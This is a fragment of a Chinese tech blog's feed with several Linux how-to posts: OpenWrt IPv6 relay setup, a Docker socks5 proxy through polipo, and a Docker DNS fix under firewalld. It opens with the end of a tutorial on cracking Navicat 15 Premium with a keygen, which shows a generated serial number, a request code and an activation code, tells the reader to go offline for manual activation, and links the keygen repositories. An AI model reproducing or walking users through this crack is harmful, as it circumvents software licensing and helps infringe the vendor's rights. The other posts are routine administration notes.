class="hljs-bullet">5.</span> Spanish<br><span class="hljs-bullet">6.</span> French<br><span class="hljs-bullet">7.</span> German<br><span class="hljs-bullet">8.</span> Korean<br><span class="hljs-bullet">9.</span> Russian<br><span class="hljs-bullet">10.</span> Portuguese<br><br>(Input index)&gt; 0<br><br>[<span class="hljs-emphasis">*] Input major version number:</span><br><span class="hljs-emphasis">(range: 0 ~ 15, default: 12)&gt; 15</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Serial number:<br>NAVM-RTVJ-EO42-IODD<br><br>[<span class="hljs-emphasis">*] Your name:</span><br><span class="hljs-emphasis">你可以使用这个 序列号 来暂时激活Navicat。</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">之后你会被要求填写 用户名 和 组织名。你可以随意填写，但别太长。</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Your name: DoubleLabyrinth<br>[<span class="hljs-emphasis">*] Your organization: DoubleLabyrinth</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Input request code in Base64: (Double press ENTER to end)<br>之后你会被要求填写请求码。注意不要关闭keygen。<br><br>断开网络. 找到注册窗口，填写keygen给你的 序列号，然后点击 激活。<br><br>通常在线激活会失败，所以在弹出的提示中选择 手动激活。<br><br>复制 请求码 到keygen，连按两次回车结束。<br><br>[<span class="hljs-emphasis">*] Input request code in Base64: (Double press ENTER to end)</span><br><span class="hljs-emphasis">OaGPC3MNjJ/pINbajFzLRkrV2OaSXYLr2tNLDW0fIthPOJQFXr84OOroCY1XN8R2xl2j7epZ182PL6q+BRaSC6hnHev/cZwhq/4LFNcLu0T0D/QUhEEBJl4QzFr8TlFSYI1qhWGLIxkGZggA8vMLMb/sLHYn9QebBigvleP9dNCS4sO82bilFrKFUtq3ch8r7V3mbcbXJCfLhXgrHRvT2FV/s1BFuZzuWZUujxlp37U6Y2PFD8fQgsgBUwrxYbF0XxnXKbCmvtgh2yaB3w9YnQLoDiipKp7io1IxEFMYHCpjmfTGk4WU01mSbdi2OS/wm9pq2Y62xvwawsq1WQJoMg==</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Request Info:<br>&#123;&quot;K&quot;:&quot;NAVMRTVJEO42IODD&quot;, &quot;DI&quot;:&quot;4A12F84C6A088104D23E&quot;, &quot;P&quot;:&quot;linux&quot;&#125;<br><br>[<span class="hljs-emphasis">*] Response Info:</span><br><span class="hljs-emphasis">&#123;&quot;K&quot;:&quot;NAVMRTVJEO42IODD&quot;,&quot;DI&quot;:&quot;4A12F84C6A088104D23E&quot;,&quot;N&quot;:&quot;DoubleLabyrinth&quot;,&quot;O&quot;:&quot;DoubleLabyrinth&quot;,&quot;T&quot;:1575543648&#125;</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Activation Code:<br>i45HIr7T1g69Cm9g3bN1DBpM/Zio8idBw3LOFGXFQjXj0nPfy9yRGuxaUBQkWXSOWa5EAv7S9Z1sljlkZP6cKdfDGYsBb/4N1W5Oj1qogzNtRo5LGwKe9Re3zPY3SO8RXACfpNaKjdjpoOQa9GjQ/igDVH8r1k+Oc7nEnRPZBm0w9aJIM9kS42lbjynVuOJMZIotZbk1NloCodNyRQw3vEEP7kq6bRZsQFp2qF/mr+hIPH8lo/WF3hh+2NivdrzmrKKhPnoqSgSsEttL9a6ueGOP7Io3j2lAFqb9hEj1uC3tPRpYcBpTZX7GAloAENSasFwMdBIdszifDrRW42wzXw==<br></code></pre></td></tr></table></figure><p>最终你会得到一个base64编码的 激活码。将之复制到 手动激活 的窗口，然后点击 <strong>激活</strong>。如果没有什么意外，应该可以成功激活。</p><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> ~/Desktop/navicat15-premium-en.AppImage</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -rf ~/Desktop/navicat15-premium-en-patched</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> ~/Desktop/navicat15-premium-en-patched.AppImage ~/Desktop/navicat15-premium-en.AppImage</span><br></code></pre></td></tr></table></figure><h2 id="后续使用"><a href="#后续使用" class="headerlink" title="后续使用"></a>后续使用</h2><p>你可以将激活的navicat15放置于&#x2F;opt目录下或者&#x2F;usr&#x2F;local&#x2F;share目录下，设置一个软连接，方便在终端及命令行调用，我的navicat15-premium-en.AppImage放置的目录为：&#x2F;usr&#x2F;local&#x2F;share&#x2F;,使用以下命令建立软连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /usr/local/share/navicat15-premium-en.AppImage<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -sf /usr/local/share/navicat15-premium-en.AppImage /usr/local/bin/navicat15<br></code></pre></td></tr></table></figure><p><img src="/img/20200323-crack-navicat-15-for-linux.png" alt="20200323-crack-navicat-15-for-linux.png"></p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://gitee.com/yangzhuoming/navicat-keygen">https://gitee.com/yangzhuoming/navicat-keygen</a></li><li><a href="https://github.com/DoubleLabyrinth/navicat-keygen.git">https://github.com/DoubleLabyrinth/navicat-keygen.git</a></li><li><a href="https://github.com/AppImage/AppImageKit/">https://github.com/AppImage/AppImageKit/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openwrt 配置ipv6</title>
    <link href="/2020/03/13/2020-03-13-openwrt-set-ipv6/"/>
    <url>/2020/03/13/2020-03-13-openwrt-set-ipv6/</url>
    
    <content type="html"><![CDATA[<p>openwrt 配置ipv6</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前一直只有教育网或者局部地区测试的IPv6现在已经大范围推开，大部分地区的ISP均正确部署了IPv6。通常来说，Openwrt获取IPv6的方式有三种：中继、穿透和NAT，由于ISP已经提供了IPv6和某些方案的缺陷，择优采取中继的方案。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先将光猫的模式调为桥接或者混合模式，然后通过电脑拨号确认ISP是否已经正确配置IPv6。<br>然后升级路由器的Openwrt的版本，最好不要低于17.01，否则odhcpd可能会出现问题，当然更老的版本也能正确获取IPv6，不过可能需要每隔一段时间就重启一次odhcpd。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>从Openwrt 15.xx（即CC版本）开始，默认的初始设置中就会含有wan6，无需安装其它软件包。<br>由于Openwrt默认分配IPv6私网网段，首先应该删除网络&gt;接口页面内IPv6 ULA 前缀配置自动生成的fd开头的&#x2F;64随机IPv6地址段并保存生效。其实这个时候，在较新版本的Openwrt上面应该已经成功获取了IPv6。<br>然后我们需要修改&#x2F;etc&#x2F;config&#x2F;dhcp文件，使用无状态地址自动配置（SLAAC）IPv6，而不是DHCPv6。<br>为了保险期间，首先需要备份dhcp配置文件，以便遇到问题进行回滚。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/etc/</span>config<span class="hljs-regexp">/dhcp /</span>etc<span class="hljs-regexp">/config/</span>dhcp.backup<br></code></pre></td></tr></table></figure><p>然后修改dhcp的配置示例如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">config dhcp <span class="hljs-string">&#x27;lan&#x27;</span><br>        option <span class="hljs-keyword">interface</span> &#x27;<span class="hljs-symbol">lan</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">start</span> &#x27;<span class="hljs-symbol">100</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">limit</span> &#x27;<span class="hljs-symbol">150</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">leasetime</span> &#x27;<span class="hljs-symbol">12h</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">dhcpv6</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ra</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ndp</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ra_management</span> &#x27;<span class="hljs-symbol">1</span>&#x27;<br><br><span class="hljs-symbol">config</span> <span class="hljs-symbol">dhcp</span> &#x27;<span class="hljs-symbol">wan</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">interface</span> &#x27;<span class="hljs-symbol">wan</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ignore</span> &#x27;<span class="hljs-symbol">1</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">dhcpv6</span> &#x27;<span class="hljs-symbol">disabled</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ndp</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ra</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">master</span> &#x27;<span class="hljs-symbol">1</span>&#x27;<br><br><span class="hljs-symbol">config</span> <span class="hljs-symbol">dhcp</span> &#x27;<span class="hljs-symbol">wan6</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">dhcpv6</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ra</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">ndp</span> &#x27;<span class="hljs-symbol">relay</span>&#x27;<br>        <span class="hljs-symbol">option</span> <span class="hljs-symbol">master</span> &#x27;<span class="hljs-symbol">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>配置完成之后需要重启network服务，以便接入终端获取IPv6地址：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>network restart<br></code></pre></td></tr></table></figure><p>至此所有的客户端包括路由器均可获得可用的IPv6地址，不过在部分操作系统上dhcp不会马上获取到ipv6，需要手动刷新一下：<br>Windows下面，需要在CMD中执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /release6<br>ipconfig /renew6<br></code></pre></td></tr></table></figure><p>在Linux下面，可以重启dhcp或者NetworkManager服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart dhcpcd<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart NetworkManager<br></code></pre></td></tr></table></figure><p>每个发行版本重启网络的方式不一样，请根据实际情况刷新网络<br><img src="/img/20200313-ip-addr.png" alt="20200313-ip-addr.png"></p><h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><p>体验较好，可以访问ipv6站点。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="http://blog.kompaz.win/2017/02/22/OpenWRT%20IPv6%20%E9%85%8D%E7%BD%AE/">http://blog.kompaz.win/2017/02/22/OpenWRT%20IPv6%20%E9%85%8D%E7%BD%AE/</a></li><li><a href="https://openwrt.org/docs/guide-user/network/ipv6/start">https://openwrt.org/docs/guide-user/network/ipv6/start</a></li><li><a href="https://linkthis.me/2018/12/04/ipv6-on-openwrt/">https://linkthis.me/2018/12/04/ipv6-on-openwrt/</a></li><li><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Openwrt</tag>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker容器使用socks5做全局代理</title>
    <link href="/2020/03/07/2020-03-07-docker-container-use-socks5-proxy/"/>
    <url>/2020/03/07/2020-03-07-docker-container-use-socks5-proxy/</url>
    
    <content type="html"><![CDATA[<p>docker容器使用socks5做全局代理</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>博主自行构建ubuntu容器来编译openwrt，部分组件构建需要获取墙外资源，博主使用的代理工具，支持的协议<br>为socks5，但是容器中部分工具如：<strong>wget</strong> 只支持http代理，所以在容器中需要配置socks5转http全局代理。</p><h2 id="宿主机代理配置"><a href="#宿主机代理配置" class="headerlink" title="宿主机代理配置"></a>宿主机代理配置</h2><p>需要修改宿主机代理客户端配置，方便局域网其他主机连接代理，容器使用的网络类型为桥接。之前也使用过host网<br>络，但是在容器中测试并未成功。为了能迅速编译openwrt，只能使用默认桥接网络进行代理。</p><p>首先配置客户端，允许局域网中其他主机进行连接，我这里直接配置成“0.0.0.0”，虽说这个不安全，但是在局域网中<br>风险暂时可以接受。这里需要注意，需要使用firewalld或者iptables启用本地代理端口。firewalld配置指令如下：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">port=6666/tcp</span><br></code></pre></td></tr></table></figure><p>个人本地代理服务器配置如下：<br><img src="/img/20200307-proxy-client.png" alt="20200307-proxy-client.png"><br>宿主机本地的代理端口为：6666，未设置验证用户名和密码<br>可以使用局域网中其他主机测试一下，宿主机本地代理服务器是否配置成功，测试过程这里就不在赘述了。</p><h2 id="容器构建配置"><a href="#容器构建配置" class="headerlink" title="容器构建配置"></a>容器构建配置</h2><p>以下Dockerfile配置文件仅供参考，这是我为了编译openwrt自行构建的。除了openwrt编译需要的基础环境，<br>我增加了polipo，我使用polipo这个工具进行全局代理。设置http和https代理地址。由于polipo只存在ubuntu 20.04 LTS之前的版本库中，这里直接在最新版ubuntu中安装polipo的deb包。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<br><br><span class="hljs-keyword">ENV</span> LANG en_US.UTF-<span class="hljs-number">8</span><br><span class="hljs-keyword">ENV</span> LANGUAGE en_US.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span> &gt;/etc/timezone</span><br><br><span class="hljs-comment"># config apt sources.list</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update -qq &amp;&amp; \</span><br><span class="language-bash">    apt-get upgrade -qqy &amp;&amp; \</span><br><span class="language-bash">    apt-get install -qqy build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib wget iputils-ping curl  &amp;&amp; \</span><br><span class="language-bash">    apt-get clean &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">rm</span> -rf /tmp/* /var/tmp/*</span><br><br><span class="hljs-comment"># install polipo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget http://archive.ubuntu.com/ubuntu/pool/universe/p/polipo/polipo_1.1.1-8_amd64.deb &amp;&amp; \</span><br><span class="language-bash">    dpkg -i polipo_1.1.1-8_amd64.deb</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> config /etc/polipo/config</span><br><br><span class="hljs-keyword">ENV</span> http_proxy <span class="hljs-string">&quot;http://127.0.0.1:8183&quot;</span><br><span class="hljs-keyword">ENV</span> https_proxy  <span class="hljs-string">&quot;http://127.0.0.1:8183&quot;</span><br></code></pre></td></tr></table></figure><p>polipo配置文件如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">logSyslog</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">logFile</span> = /var/log/polipo/polipo.log<br><span class="hljs-attr">socksParentProxy</span> = <span class="hljs-string">&quot;192.168.3.200:6666&quot;</span><br><span class="hljs-attr">socksProxyType</span> = socks5<br><span class="hljs-attr">proxyPort</span> = <span class="hljs-number">8183</span><br><span class="hljs-attr">proxyAddress</span> = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br><span class="hljs-attr">allowedClients</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>宿主机的ip为192.168.3.200，宿主机代理服务器启用的端口为：6666，polipo全局代理的端口为8183<br>使用以下指令进行构建</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker <span class="hljs-keyword">build </span>-t openwrt-<span class="hljs-keyword">build-env </span>.<br></code></pre></td></tr></table></figure><h2 id="启用容器并进行测试"><a href="#启用容器并进行测试" class="headerlink" title="启用容器并进行测试"></a>启用容器并进行测试</h2><p>执行以下指令映射本地目录到容器中去</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -itd --name openwrt-build-env -v ～/openwrt/openwrt:/home/user/openwrt openwrt-build-env</span><br></code></pre></td></tr></table></figure><p>使用以下指令进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it openwrt-build-env /bin/bash<br></code></pre></td></tr></table></figure><p>polipo未设置自启动，需要手动运行</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>polipo start<br></code></pre></td></tr></table></figure><p>使用以下指令测试代理是否成功</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">curl cip.<span class="hljs-keyword">cc</span><br></code></pre></td></tr></table></figure><p><img src="/img/20200307-proxy-test.png" alt="20200307-proxy-test.png"><br>显示得ip位于国外，代理成功，可以开心编译openwrt了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果有http协议的代理工具，使用以下指令直接配置即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://ip:port&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://ip:port&quot;</span><br></code></pre></td></tr></table></figure><p>这篇文章其实有点儿鸡肋，可以在容器之外安装polipo或者其他工具，将sock5协议转成http协议，然后配置全局代理即可。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://wiki.archlinux.org/index.php/Polipo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Polipo (简体中文))</a></li><li><a href="https://juejin.im/post/5c91ff5ee51d4534446edb9a">https://juejin.im/post/5c91ff5ee51d4534446edb9a</a></li><li><a href="https://milkice.me/2019/08/07/docker-network-tunnel/">https://milkice.me/2019/08/07/docker-network-tunnel/</a></li><li><a href="https://zhanghongtong.github.io/2019/06/27/Ubuntu%E5%92%8Cdocker%E4%BD%BF%E7%94%A8shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BF%BB%E5%A2%99/">https://zhanghongtong.github.io/2019/06/27/Ubuntu%E5%92%8Cdocker%E4%BD%BF%E7%94%A8shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BF%BB%E5%A2%99/</a></li><li><a href="https://wiki.archlinux.org/index.php/Docker#Proxy_configuration">https://wiki.archlinux.org/index.php/Docker#Proxy_configuration</a></li><li><a href="https://docs.docker.com/network/proxy/#use-environment-variables">https://docs.docker.com/network/proxy/#use-environment-variables</a></li><li><a href="https://kebingzao.com/2019/02/14/centos7-ss-proxy/">https://kebingzao.com/2019/02/14/centos7-ss-proxy/</a></li><li><a href="https://kebingzao.com/2019/02/22/docker-container-proxy/">https://kebingzao.com/2019/02/22/docker-container-proxy/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Proxy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>archlinux docker 容器dns服务失效问题</title>
    <link href="/2020/03/05/2020-03-05-solve-archlinux-docker-container-dns-not-working/"/>
    <url>/2020/03/05/2020-03-05-solve-archlinux-docker-container-dns-not-working/</url>
    
    <content type="html"><![CDATA[<p>archlinux docker 容器dns服务失效问题</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>博主一台archlinux服务器上运行docker服务，在docker容器中dns域名解析总是失败，具体现象是可以ping通<br>DNS服务器，但是无法解析相关域名，已在容器中配置DNS，宿主机网络一切正常。具体现象如下：</p><p><img src="/img/20200305-docker-dns-not-working.png" alt="20200305-docker-dns-not-working.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nslookup: <span class="hljs-keyword">write</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;8.8.8.8&#x27;</span>: <span class="hljs-keyword">No</span> route <span class="hljs-keyword">to</span> host<br>;; <span class="hljs-keyword">connection</span> timed <span class="hljs-keyword">out</span>; <span class="hljs-keyword">no</span> servers could be reached<br></code></pre></td></tr></table></figure><p>同样问题存在docker镜像构建过程中，博主在构建ubuntu镜像，同步软件源会出现以下问题，导致构建失败</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">W: Failed to fetch http:<span class="hljs-regexp">//</span>archive.ubuntu.com<span class="hljs-regexp">/ubuntu/</span>dists<span class="hljs-regexp">/bionic/</span>InRelease  Temporary failure resolving <span class="hljs-string">&#x27;archive.ubuntu.com&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/20200305-dockerfile-build-failed.png" alt="20200305-dockerfile-build-failed.png"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="配置docker-dns"><a href="#配置docker-dns" class="headerlink" title="配置docker dns"></a>配置docker dns</h3><p>使用vim或者其他文本工具打开 <strong>&#x2F;etc&#x2F;docker&#x2F;daemon.json</strong> 在daemon.json中设置DNS，新增<code>&quot;dns&quot;: [&quot;114.114.114.114&quot;,&quot;8.8.8.8&quot;]</code>如下所示：<br><img src="/img/20200305-docker-dns-config.png" alt="20200305-docker-dns-config.png"></p><p>设置DNS重启docker，docker容器中DNS服务仍然存在问题，通过博主不断尝试，发现系统启用firewalld防火墙，<br>导致DNS服务未生效，通过以下指令将docker0网卡添加到信任区，发现DNS服务生效了。</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sudo firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanent</span> <span class="hljs-literal">--</span><span class="hljs-comment">zone=trusted</span> <span class="hljs-literal">--</span><span class="hljs-comment">change</span><span class="hljs-literal">-</span><span class="hljs-comment">interface=docker0</span><br><span class="hljs-comment">sudo firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">reload</span><br><span class="hljs-comment">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>目前并未探明之前的防火墙策略为何会阻断DNS服务，哪位大佬可以指导一下，我将不胜感激。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">docker <span class="hljs-keyword">run</span> --name box1 -it --<span class="hljs-keyword">rm</span> busybox <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>我们使用busybox 启动一个容器服务来测试网络。<br><img src="/img/20200305-docker-dns-working.png" alt="20200305-docker-dns-working.png"><br>DNS服务正常。可以使用</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="https://github.com/moby/moby/issues/36151">https://github.com/moby/moby/issues/36151</a></li><li><a href="https://askubuntu.com/questions/881843/dns-issue-with-docker-image">https://askubuntu.com/questions/881843/dns-issue-with-docker-image</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下的split 命令（将一个大文件根据行数平均分成若干个小文件）</title>
    <link href="/2020/02/22/2020-02-22-split-large-file/"/>
    <url>/2020/02/22/2020-02-22-split-large-file/</url>
    
